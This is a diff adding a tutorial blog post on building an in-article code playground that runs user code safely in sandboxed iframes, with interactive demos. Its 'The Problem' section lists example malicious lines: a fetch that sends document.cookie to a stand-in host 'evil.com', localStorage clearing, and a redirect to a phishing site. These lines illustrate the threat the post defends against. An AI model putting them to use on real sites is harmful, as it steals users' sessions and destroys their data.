@@ -1,0 +1,433 @@
+---
+title: "Building a Code Playground: Running User Code Safely"
+description: "How to build a code playground that runs user code safely using sandboxed iframes, and why it matters for interactive content."
+date: "2026-01-17"
+author: "scott-peabody"
+tags: ["react", "typescript", "security", "tutorial", "features"]
+featured: true
+readingTime: 12
+---
+
+import { Callout, CodePlayground } from '@/components/mdx'
+
+One of my goals for rendered_useful is to let people create interactive content. Not just read about code, but *run* it. Think CodePen, but integrated into articles and personal spaces.
+
+The challenge? Running user code is dangerous. This article explains how to do it safely, and yes, **the playgrounds in this article are real**. Try them.
+
+## The Problem
+
+When you let users write and run code on your site, bad things can happen:
+
+```javascript
+// A malicious user might try:
+document.cookie  // Steal authentication
+fetch('https://evil.com/steal?data=' + document.cookie)
+localStorage.clear()  // Destroy data
+window.location = 'https://phishing-site.com'
+```
+
+If their code runs in your page context, they can do anything you can do. Game over.
+
+## The Solution: Sandboxed iframes
+
+The browser has a powerful security feature: the `sandbox` attribute on iframes. It creates an isolated environment where code can run without access to the parent page.
+
+<CodePlayground
+  title="Basic Sandbox Demo"
+  initialHtml={`<h1>I'm in a sandbox!</h1>
+<p>Try clicking the button below:</p>
+<button onclick="tryEscape()">Try to Access Parent</button>
+<div id="result"></div>`}
+  initialCss={`body { font-family: system-ui; }
+button { 
+  padding: 10px 20px; 
+  background: #3b82f6; 
+  color: white; 
+  border: none; 
+  border-radius: 6px;
+  cursor: pointer;
+  margin: 10px 0;
+}
+button:hover { background: #2563eb; }
+#result { 
+  margin-top: 10px; 
+  padding: 10px; 
+  background: #f3f4f6; 
+  border-radius: 4px;
+}`}
+  initialJs={`function tryEscape() {
+  const result = document.getElementById('result');
+  try {
+    // Try to access parent window
+    const parentDoc = parent.document;
+    result.textContent = '😱 Escaped! (this should not happen)';
+  } catch(e) {
+    result.textContent = '✅ Blocked: ' + e.message;
+  }
+}`}
+  height={450}
+/>
+
+Try clicking the button above. The code tries to access `parent.document` but the sandbox blocks it. This is the foundation of safe code execution.
+
+## How the Sandbox Works
+
+Here's the key insight: the iframe's `sandbox` attribute restricts what code can do:
+
+```html
+<iframe
+  srcDoc="...user code..."
+  sandbox="allow-scripts"
+/>
+```
+
+With `sandbox="allow-scripts"`:
+- ✅ JavaScript can run
+- ❌ Cannot access parent window
+- ❌ Cannot access parent cookies
+- ❌ Cannot navigate the parent
+- ❌ Cannot access localStorage (by default)
+- ❌ Different origin, even if same domain
+
+<Callout type="info" title="The Origin Trick">
+  A sandboxed iframe without `allow-same-origin` gets a unique, opaque origin. It's like running on a completely different website, even though it's embedded in your page.
+</Callout>
+
+## Building the Playground
+
+The playground is a custom React component, not an external library. It combines three code editors with a live preview, all powered by a few key pieces:
+
+### The Stack
+
+- **CodeMirror 6** for syntax highlighting. It's modular, so we only import what we need: `@codemirror/lang-html`, `@codemirror/lang-css`, `@codemirror/lang-javascript`, and the `oneDark` theme. Adds about 150KB gzipped.
+- **Sandboxed iframe** for safe code execution. The browser does all the heavy lifting. No server required.
+- **postMessage API** for parent-child communication. The iframe sends console output back to the React component.
+
+### How It Works
+
+1. User edits code in CodeMirror editors
+2. React combines HTML, CSS, and JS into a single HTML document string
+3. That string goes into the iframe's `srcDoc` attribute
+4. The iframe renders the preview in an isolated sandbox
+5. Console methods in the iframe are intercepted and sent via `postMessage`
+6. The parent component receives messages and displays them in the console panel
+
+Each playground instance gets a unique ID, so multiple playgrounds on a page don't cross-contaminate their console output.
+
+The whole component is about 300 lines of TypeScript. No build servers, no external services. Just React, CodeMirror, and native browser APIs.
+
+## Capturing Console Output
+
+One tricky part: `console.log` normally goes to the browser's dev tools, not our UI. We solve this by intercepting console methods:
+
+<CodePlayground
+  title="Console Capture Demo"
+  initialHtml={`<h2>Console Demo</h2>
+<p>Check the console panel below!</p>
+<button onclick="runDemo()">Run Examples</button>`}
+  initialCss={`body { font-family: system-ui; padding: 10px; }
+button { 
+  padding: 10px 20px;
+  background: #10b981;
+  color: white;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+}
+button:hover { background: #059669; }`}
+  initialJs={`function runDemo() {
+  console.log('Hello from console.log!');
+  console.log('Objects work too:', { name: 'test', value: 42 });
+  console.warn('This is a warning');
+  console.error('This is an error');
+  console.log('Arrays:', [1, 2, 3]);
+}
+
+// Run once on load
+console.log('Playground loaded!');`}
+  height={480}
+/>
+
+Click the "Console" button in the header to see the output panel. The playground intercepts `console.log`, `console.warn`, and `console.error`, sending them to the parent via `postMessage`.
+
+## CSS Experiments
+
+The playground is great for experimenting with CSS. Try modifying this flexbox example:
+
+<CodePlayground
+  title="CSS Flexbox Playground"
+  initialHtml={`<div class="container">
+  <div class="box">1</div>
+  <div class="box">2</div>
+  <div class="box">3</div>
+  <div class="box">4</div>
+  <div class="box">5</div>
+</div>
+
+<p class="hint">Try changing justify-content to: flex-start, flex-end, center, space-between, space-around, space-evenly</p>`}
+  initialCss={`.container {
+  display: flex;
+  justify-content: space-between;
+  gap: 10px;
+  padding: 20px;
+  background: #f0f0f0;
+  border-radius: 8px;
+}
+
+.box {
+  width: 60px;
+  height: 60px;
+  background: #6366f1;
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: 8px;
+  font-weight: bold;
+  font-size: 1.5em;
+}
+
+.hint {
+  margin-top: 15px;
+  font-size: 0.9em;
+  color: #666;
+}`}
+  initialJs={`// CSS-only demo - no JS needed!`}
+  height={420}
+/>
+
+## Interactive JavaScript
+
+Here's a more complex example: a simple counter with state.
+
+<CodePlayground
+  title="Interactive Counter"
+  initialHtml={`<div class="counter">
+  <button id="decrement">−</button>
+  <span id="count">0</span>
+  <button id="increment">+</button>
+</div>
+<button id="reset">Reset</button>`}
+  initialCss={`.counter {
+  display: flex;
+  align-items: center;
+  gap: 20px;
+  justify-content: center;
+  margin: 30px 0;
+}
+
+#count {
+  font-size: 3em;
+  font-weight: bold;
+  min-width: 100px;
+  text-align: center;
+  color: #1a1a1a;
+}
+
+button {
+  width: 50px;
+  height: 50px;
+  font-size: 1.5em;
+  border: none;
+  border-radius: 50%;
+  background: #6366f1;
+  color: white;
+  cursor: pointer;
+  transition: transform 0.1s, background 0.2s;
+}
+
+button:hover {
+  background: #4f46e5;
+}
+
+button:active {
+  transform: scale(0.95);
+}
+
+#reset {
+  display: block;
+  margin: 0 auto;
+  width: auto;
+  padding: 10px 30px;
+  border-radius: 8px;
+}`}
+  initialJs={`let count = 0;
+const countEl = document.getElementById('count');
+const increment = document.getElementById('increment');
+const decrement = document.getElementById('decrement');
+const reset = document.getElementById('reset');
+
+function updateDisplay() {
+  countEl.textContent = count;
+  countEl.style.color = count > 0 ? '#10b981' : count < 0 ? '#ef4444' : '#1a1a1a';
+}
+
+increment.onclick = () => { count++; updateDisplay(); };
+decrement.onclick = () => { count--; updateDisplay(); };
+reset.onclick = () => { count = 0; updateDisplay(); };
+
+console.log('Counter initialized!');`}
+  height={450}
+/>
+
+## Animation Demo
+
+CSS animations work great too:
+
+<CodePlayground
+  title="CSS Animation"
+  initialHtml={`<div class="scene">
+  <div class="ball"></div>
+</div>
+<p>The ball bounces using pure CSS animation!</p>`}
+  initialCss={`.scene {
+  height: 200px;
+  background: linear-gradient(to bottom, #1e3a5f, #0f172a);
+  border-radius: 8px;
+  position: relative;
+  overflow: hidden;
+}
+
+.ball {
+  width: 40px;
+  height: 40px;
+  background: radial-gradient(circle at 30% 30%, #fbbf24, #f59e0b);
+  border-radius: 50%;
+  position: absolute;
+  left: 50%;
+  transform: translateX(-50%);
+  animation: bounce 1s ease-in-out infinite;
+  box-shadow: 0 0 20px rgba(251, 191, 36, 0.5);
+}
+
+@keyframes bounce {
+  0%, 100% {
+    top: 10px;
+    animation-timing-function: ease-in;
+  }
+  50% {
+    top: 140px;
+    animation-timing-function: ease-out;
+    transform: translateX(-50%) scaleY(0.8);
+  }
+}
+
+p {
+  text-align: center;
+  color: #666;
+  margin-top: 15px;
+}`}
+  initialJs={`// Pure CSS animation - no JS needed!
+console.log('Animation running with CSS only');`}
+  height={440}
+/>
+
+## Security Considerations
+
+Even with sandboxing, there are things to think about:
+
+### What the Sandbox Blocks
+
+| Attack | Blocked? | How |
+|--------|----------|-----|
+| Access parent DOM | ✅ | Different origin |
+| Steal cookies | ✅ | Different origin |
+| Redirect parent | ✅ | `sandbox` blocks navigation |
+| Infinite loops | ⚠️ | Only freezes iframe, not parent |
+| Memory bombs | ⚠️ | Browser will kill the tab eventually |
+| Network requests | ✅ | Disabled by default (CSP) |
+
+### Enabling Network Access
+
+By default, playgrounds can't make network requests. No `fetch()`, no loading external images, nothing. This is enforced via Content Security Policy.
+
+But sometimes you *need* network access. The `allowNetwork` prop enables it, but shows a clear warning:
+
+<CodePlayground
+  title="Wikipedia API Demo"
+  allowNetwork
+  initialHtml={`<h2>Web Security</h2>
+<p id="extract">Click the button to fetch from Wikipedia...</p>
+<button id="fetch-btn">Fetch Article</button>`}
+  initialCss={`body { font-family: system-ui; padding: 10px; }
+h2 { margin-top: 0; color: #1e3a5f; }
+#extract {
+  line-height: 1.6;
+  color: #333;
+}
+button {
+  padding: 10px 20px;
+  background: #3b82f6;
+  color: white;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  margin-bottom: 15px;
+}
+button:hover { background: #2563eb; }
+.loading { color: #666; font-style: italic; }`}
+  initialJs={`document.getElementById('fetch-btn').onclick = async () => {
+  const el = document.getElementById('extract');
+  el.textContent = 'Loading...';
+  el.className = 'loading';
+  
+  try {
+    const res = await fetch(
+      'https://en.wikipedia.org/api/rest_v1/page/summary/Web_security'
+    );
+    const data = await res.json();
+    el.textContent = data.extract;
+    el.className = '';
+    console.log('Fetched:', data.title);
+  } catch(e) {
+    el.textContent = 'Error: ' + e.message;
+    console.error(e);
+  }
+};`}
+  height={420}
+/>
+
+Notice the amber warning banner at the top. This tells users the playground can make external requests. Important for transparency when embedding untrusted code.
+
+### Adding More Restrictions
+
+You can make the sandbox even stricter:
+
+```html
+<!-- Most restrictive - no JS at all -->
+<iframe sandbox srcDoc="..."></iframe>
+
+<!-- Allow scripts only -->
+<iframe sandbox="allow-scripts" srcDoc="..."></iframe>
+
+<!-- Allow scripts + forms -->
+<iframe sandbox="allow-scripts allow-forms" srcDoc="..."></iframe>
+
+<!-- Allow scripts + local storage (more dangerous) -->
+<iframe sandbox="allow-scripts allow-same-origin" srcDoc="..."></iframe>
+```
+
+<Callout type="warning" title="Careful with allow-same-origin">
+  Adding `allow-same-origin` to a sandbox lets the iframe access `localStorage` and `sessionStorage`, but it also weakens isolation. Only use it if you need storage and understand the risks.
+</Callout>
+
+## What's Next
+
+The playground works great for HTML/CSS/JS, but there's room to grow:
+
+- **Python support** via Pyodide (~10MB WebAssembly runtime)
+- **TypeScript** with in-browser transpilation
+- **External libraries** loaded from CDN
+- **Save and share** with unique URLs
+
+The foundation is solid. Sandboxed iframes give us safe code execution, CodeMirror gives us a real editor experience, and `postMessage` handles communication. Adding new features is just building on top.
+
+## Try It Yourself
+
+Play with the examples above! Change the CSS colors, modify the JavaScript logic, break things and fix them. That's the whole point: learning by doing, right in the article.
+
+Every playground in this article is fully functional. The code you see is the code that runs. No tricks, no pre-recorded output. Just CodeMirror, an iframe, and the browser's built-in security.
+
+---
+
+*The CodePlayground component is about 300 lines of TypeScript. View the source on [GitHub](https://github.com/ScottPeabody/rendered_useful/blob/main/src/components/mdx/CodePlayground.tsx).*
